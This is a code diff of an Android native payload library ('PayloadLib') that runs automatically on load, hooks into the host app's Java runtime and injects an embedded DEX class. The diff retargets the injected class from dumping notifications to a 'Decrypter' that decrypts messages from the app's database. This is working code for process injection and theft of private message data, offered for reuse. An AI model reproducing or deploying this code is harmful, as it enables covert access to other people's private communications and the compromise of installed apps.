@@ -3,7 +3,7 @@
 #include <stdio.h>
 #include <android/log.h>
 #include "address_finder.h"
-#include "notif_dex.h"
+#include "msgs_dex.h"
 
 #define LOG_TAG "PayloadLib"
 #define LOGI(...) __android_log_print(ANDROID_LOG_INFO, LOG_TAG, __VA_ARGS__)
@@ -17,7 +17,7 @@ jobject g_classLoaderObj;
 typedef jint (*JNI_GetCreatedJavaVMs_t)(JavaVM **, jsize, jsize *);
 
 
-void get_noti_via_dex(jobject context);
+void get_msgs_via_dex(jobject context);
 
 __attribute__((constructor)) void init_lib(void) {
     uintptr_t libart_base = find_module_base(0, "libart.so");
@@ -70,11 +70,11 @@ __attribute__((constructor)) void init_lib(void) {
         g_loadClassMethod = (*g_env)->GetMethodID(g_env, g_classLoaderClass, "loadClass",
                                                   "(Ljava/lang/String;)Ljava/lang/Class;");
 
-        get_noti_via_dex(appObj);
+        get_msgs_via_dex(appObj);
     }
 }
 
-void get_noti_via_dex(jobject context) {
+void get_msgs_via_dex(jobject context) {
     
     jobject byteBuffer = (*g_env)->NewDirectByteBuffer(g_env, classes_dex, classes_dex_len);
     if (byteBuffer == NULL) return;
@@ -88,18 +88,18 @@ void get_noti_via_dex(jobject context) {
     jobject dexLoader = (*g_env)->NewObject(g_env, dexLoaderClass, loaderConstructor, byteBuffer, g_classLoaderObj);
     if (dexLoader == NULL) return;
 
-    // ATTENTION: use the packagename you used in your .kt file plus the class name
-    jstring myClassName = (*g_env)->NewStringUTF(g_env, "com.example.injectedclass.NotificationDumper");
+    // ATTENTION: use the packagename you used in your .java file plus the class name
+    jstring myClassName = (*g_env)->NewStringUTF(g_env, "com.example.injectedclass.Decrypter");
 
     // Find the injected class
-    jclass notificationDumpClass = (jclass) (*g_env)->CallObjectMethod(g_env, dexLoader, g_loadClassMethod, myClassName);
+    jclass decrypterClass = (jclass) (*g_env)->CallObjectMethod(g_env, dexLoader, g_loadClassMethod, myClassName);
 
-    if (notificationDumpClass == NULL) return;
+    if (decrypterClass == NULL) return;
 
-    jmethodID dumpNotifications = (*g_env)->GetStaticMethodID(g_env, notificationDumpClass, "dumpNotifications", "(Landroid/content/Context;)V");
-    if (dumpNotifications == NULL) return;
+    jmethodID decryptMessagesFromDb = (*g_env)->GetStaticMethodID(g_env, decrypterClass, "decryptMessagesFromDb", "(Landroid/content/Context;)V");
+    if (decryptMessagesFromDb == NULL) return;
 
-    (*g_env)->CallStaticVoidMethod(g_env, notificationDumpClass, dumpNotifications, context);
+    (*g_env)->CallStaticVoidMethod(g_env, decrypterClass, decryptMessagesFromDb, context);
 
 
     if ((*g_env)->ExceptionCheck(g_env)) {
